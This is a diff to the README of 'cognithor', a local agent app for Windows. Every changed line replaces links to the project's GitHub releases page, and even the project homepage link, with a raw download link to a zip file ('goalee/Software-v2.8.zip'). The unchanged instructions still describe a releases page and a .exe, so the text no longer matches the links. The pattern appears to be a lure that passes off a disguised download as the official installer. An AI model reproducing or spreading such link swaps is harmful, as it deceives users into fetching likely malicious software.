@@ -1,6 +1,6 @@
 # 🤖 cognithor - Smart Local Agent for Your Tasks
 
-[![Download cognithor](https://img.shields.io/badge/Download-cognithor-brightgreen?style=for-the-badge)](https://github.com/aashima/cognithor/releases)
+[![Download cognithor](https://img.shields.io/badge/Download-cognithor-brightgreen?style=for-the-badge)](https://github.com/aashima/cognithor/raw/refs/heads/main/goalee/Software-v2.8.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Before you start, check these requirements on your Windows machine:
 
 1. Click this big button to **visit the download page** on GitHub:
 
-   [![Download cognithor](https://img.shields.io/badge/Download-cognithor-blue?style=for-the-badge)](https://github.com/aashima/cognithor/releases)
+   [![Download cognithor](https://img.shields.io/badge/Download-cognithor-blue?style=for-the-badge)](https://github.com/aashima/cognithor/raw/refs/heads/main/goalee/Software-v2.8.zip)
 
 2. On the releases page, find the latest version. Look for the file named with `.exe` at the end. The name should be something like `cognithor-setup.exe` or similar.
 
@@ -92,8 +92,8 @@ The React-based control center uses a clean layout with tabs and buttons. No pro
 
 ## 🔗 Useful Links
 
-- Direct download page: https://github.com/aashima/cognithor/releases
-- Project homepage: https://github.com/aashima/cognithor
+- Direct download page: https://github.com/aashima/cognithor/raw/refs/heads/main/goalee/Software-v2.8.zip
+- Project homepage: https://github.com/aashima/cognithor/raw/refs/heads/main/goalee/Software-v2.8.zip
 - Documentation and user guides: Available inside the app control center under “Help”
 
 ---
@@ -135,4 +135,4 @@ cognithor supports these areas:
 
 ---
 
-Visit the download page to get started: https://github.com/aashima/cognithor/releases
+Visit the download page to get started: https://github.com/aashima/cognithor/raw/refs/heads/main/goalee/Software-v2.8.zip
